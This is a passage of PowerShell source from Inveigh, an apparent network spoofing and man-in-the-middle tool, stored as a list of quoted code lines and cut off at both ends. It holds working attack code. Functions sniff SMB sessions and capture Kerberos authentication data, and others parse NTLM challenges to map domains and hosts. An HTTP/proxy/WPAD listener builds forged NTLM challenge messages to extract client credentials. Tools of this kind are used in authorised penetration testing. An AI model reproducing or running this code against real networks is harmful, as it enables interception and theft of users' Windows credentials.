iptblock =","{","    ","    function Get-SMBConnection","    {","        param ([Byte[]]$Payload,[String]$SnifferIP,[String]$SourceIP,[String]$DestinationIP,[String]$SourcePort,[String]$SMBPort)","","        $payload_converted = [System.BitConverter]::ToString($Payload)","        $payload_converted = $payload_converted -replace \"-\",\"\"","        $session = \"$SourceIP`:$SourcePort\"","        $session_outgoing = \"$DestinationIP`:$SMBPort\"","        $SMB_index = $payload_converted.IndexOf(\"FF534D42\")","","        if(!$inveigh.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0 -and $payload_converted.SubString(($SMB_index + 8),2) -eq \"72\" -and $SourceIP -ne $SnifferIP)","        {","            $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] SMB($SMBPort) negotiation request detected from $session\") \u003e $null","        }","        elseif(!$inveigh.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0 -and $payload_converted.SubString(($SMB_index + 8),2) -eq \"72\" -and $SourceIP -eq $SnifferIP)","        {","            $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] SMB($SourcePort) outgoing negotiation request detected to $session_outgoing\") \u003e $null","        }","","        if(!$inveigh.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0)","        {","            $inveigh.SMB_session_table.Add($Session,\"\")","        }","","        $SMB_index = $payload_converted.IndexOf(\"FE534D42\")","","        if(!$inveigh.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0 -and $payload_converted.SubString(($SMB_index + 24),4) -eq \"0000\" -and $SourceIP -ne $SnifferIP)","        {","            $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] SMB($SMBPort) negotiation request detected from $session\") \u003e $null","        }","        elseif(!$inveigh.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0 -and $payload_converted.SubString(($SMB_index + 24),4) -eq \"0000\" -and $SourceIP -eq $SnifferIP)","        {","            $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] SMB($SourcePort) outgoing negotiation request detected to $session_outgoing\") \u003e $null","        }","","        if(!$inveigh.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0)","        {","            $inveigh.SMB_session_table.Add($Session,\"\")","        }","","        $SMB_index = $payload_converted.IndexOf(\"2A864886F7120102020100\")","","        if($SMB_index -gt 0 -and $SourceIP -ne $SnifferIP)","        {","            $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] SMB($SMBPort) authentication method is Kerberos for $session\") \u003e $null","","            if($Kerberos -eq 'Y')","            {","                $kerberos_length = Get-UInt16DataLength 0 $Payload[82..83]","                $kerberos_length -= $SMB_index / 2","                $kerberos_data = $Payload[($SMB_index/2)..($SMB_index/2 + $Payload.Count)]","            }","","        }","        elseif($SMB_index -gt 0 -and $SourceIP -eq $SnifferIP)","        {","            $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] SMB($SourcePort) outgoing authentication method is Kerberos to $session_outgoing\") \u003e $null","","            if($Kerberos -eq 'Y')","            {","                $kerberos_length = Get-UInt16DataLength 0 $Payload[82..83]","                $kerberos_length -= $SMB_index / 2","                $kerberos_data = $Payload[($SMB_index/2)..($SMB_index/2 + $Payload.Count)]","            }","","        }","","        return $kerberos_length,$kerberos_data","    }","","    function Get-SMBNTLMChallenge","    {","        param ([Byte[]]$Payload)","","        $payload_converted = [System.BitConverter]::ToString($Payload)","        $payload_converted = $payload_converted -replace \"-\",\"\"","        $NTLM_index = $payload_converted.IndexOf(\"4E544C4D53535000\")","","        if($NTLM_index -gt 0)","        {","","            if($payload_converted.SubString(($NTLM_index + 16),8) -eq \"02000000\")","            {","                $NTLM_challenge = $payload_converted.SubString(($NTLM_index + 48),16)","            }","","            $target_name_length = Get-UInt16DataLength (($NTLM_index + 24) / 2) $Payload","            $negotiate_flags = [System.Convert]::ToInt16(($payload_converted.SubString(($NTLM_index + 44),2)),16)","            $negotiate_flags = [Convert]::ToString($negotiate_flags,2)","            $target_info_flag = $negotiate_flags.SubString(0,1)","","            if($target_info_flag -eq 1)","            {","                $target_info_index = ($NTLM_index + 80) / 2","                $target_info_index = $target_info_index + $target_name_length + 16","                $target_info_item_type = $Payload[$target_info_index]","                $i = 0","","                while($target_info_item_type -ne 0 -and $i -lt 10)","                {","                    $target_info_item_length = Get-UInt16DataLength ($target_info_index + 2) $Payload","","                    switch($target_info_item_type) ","                    {","","                        2","                        {","                            $netBIOS_domain_name = Convert-DataToString ($target_info_index + 4) $target_info_item_length $Payload","                        }","","                        3","                        {","                            $DNS_computer_name = Convert-DataToString ($target_info_index + 4) $target_info_item_length $Payload","                        }","","                        4","                        {","                            $DNS_domain_name = Convert-DataToString ($target_info_index + 4) $target_info_item_length $Payload","                        }","","                    }","","                    $target_info_index = $target_info_index + $target_info_item_length + 4","                    $target_info_item_type = $Payload[$target_info_index]","                    $i++","                }","","                if($netBIOS_domain_name -and $DNS_domain_name -and !$inveigh.domain_mapping_table.$netBIOS_domain_name -and $netBIOS_domain_name -ne $DNS_domain_name)","                {","                    $inveigh.domain_mapping_table.Add($netBIOS_domain_name,$DNS_domain_name)","                    $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] Domain mapping added for $netBIOS_domain_name to $DNS_domain_name\") \u003e $null","                }","","                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)","                {","","                    if($inveigh.enumerate[$i].IP -eq $target -and !$inveigh.enumerate[$i].Hostname)","                    {","                        $inveigh.enumerate[$i].Hostname = $DNS_computer_name","                        $inveigh.enumerate[$i].\"DNS Domain\" = $DNS_domain_name","                        $inveigh.enumerate[$i].\"netBIOS Domain\" = $netBIOS_domain_name","                        break","                    }","","                }","","            }","","        }","","        return $NTLM_challenge","    }","","}","","# HTTP Server ScriptBlock - HTTP/HTTPS/Proxy listener","$HTTP_scriptblock =","{","    param ($Challenge,$Kerberos,$KerberosCount,$KerberosCredential,$KerberosHash,$KerberosHostHeader,$HTTPAuth,","    $HTTPBasicRealm,$HTTPContentType,$HTTPIP,$HTTPPort,$HTTPDefaultEXE,$HTTPDefaultFile,$HTTPDirectory,$HTTPResponse,","    $HTTPS_listener,$IP,$NBNSBruteForcePause,$output_directory,$Proxy,$ProxyIgnore,$proxy_listener,$WPADAuth,","    $WPADAuthIgnore,$WPADResponse)","","    function Get-NTLMChallengeBase64","    {","        param ([String]$Challenge,[Bool]$NTLMESS,[String]$ClientIPAddress,[Int]$ClientPort)","","        $HTTP_timestamp = Get-Date","        $HTTP_timestamp = $HTTP_timestamp.ToFileTime()","        $HTTP_timestamp = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($HTTP_timestamp))","        $HTTP_timestamp = $HTTP_timestamp.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}","","        if($Challenge)","        {","            $HTTP_challenge = $Challenge","            $HTTP_challenge_bytes = $HTTP_challenge.Insert(2,'-').Insert(5,'-').Insert(8,'-').Insert(11,'-').Insert(14,'-').Insert(17,'-').Insert(20,'-')","            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}","        }","        else","        {","            $HTTP_challenge_bytes = [String](1..8 | ForEach-Object {\"{0:X2}\" -f (Get-Random -Minimum 1 -Maximum 255)})","            $HTTP_challenge = $HTTP_challenge_bytes -replace ' ', ''","            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split(\" \") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}","        }","","        if($NTLMESS)","        {","            $HTTP_NTLM_negotiation_flags = 0x05,0x82,0x89,0x0a","        }","        else","        {","            $HTTP_NTLM_negotiation_flags = 0x05,0x82,0x81,0x0a","        }","","        if(!$inveigh.HTTP_session_table.ContainsKey(\"$ClientIPAddress`:$ClientPort\"))","        {","            $inveigh.HTTP_session_table.Add(\"$ClientIPAddress`:$ClientPort\",$HTTP_challenge)","        }","        else","        {","            $inveigh.HTTP_session_table[\"$ClientIPAddress`:$ClientPort\"] = $HTTP_challenge","        }","","        $inveigh.output_queue.Add(\"[*] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLM challenge $HTTP_challenge sent to $HTTP_source_IP`:$HTTP_source_port\") \u003e $null","        $hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($inveigh.computer_name)","        $netBIOS_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($inveigh.netBIOS_domain)","        $DNS_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($inveigh.DNS_domain)","        $DNS_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($inveigh.DNS_computer_name)","        $hostname_length = [System.BitConverter]::GetBytes($hostname_bytes.Length)[0,1]","        $netBIOS_domain_length = [System.BitConverter]::GetBytes($netBIOS_domain_bytes.Length)[0,1]","        $DNS_domain_length = [System.BitConverter]::GetBytes($DNS_domain_bytes.Length)[0,1]","        $DNS_hostname_length = [System.BitConverter]::GetBytes($DNS_hostname_bytes.Length)[0,1]","        $target_length = [System.BitConverter]::GetBytes($hostname_bytes.Length + $netBIOS_domain_bytes.Length + $DNS_domain_bytes.Length + $DNS_domain_bytes.Length + $DNS_hostname_bytes.Length + 36)[0,1]","        $target_offset = [System.BitConverter]::GetBytes($netBIOS_domain_bytes.Length + 56)","","        $HTTP_NTLM_bytes = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00 +","                            $netBIOS_domain_length +","                            $netBIOS_domain_length +","                            0x38,0x00,0x00,0x00 +","                            $HTTP_NTLM_negotiation_flags +","                            $HTTP_challenge_bytes +","                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +","                            $target_length +","                            $target_length + ","                            $target_offset +","                            0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f +","                            $netBIOS_domain_bytes +","                            0x02,0x00 +","                            $netBIOS_domain_length +","                            $netBIOS_domain_bytes +","                            0x01,0x00 +","                            $hostname_length +","                            $hostname_bytes +","                            0x04,0x00 +","                            $DNS_domain_length +","                            $DNS_domain_bytes +","                            0x03,0x00 +","                            $DNS_hostname_length +","                            $DNS_hostname_bytes +","                            0x05,0x00 +","                            $DNS_domain_length +","                          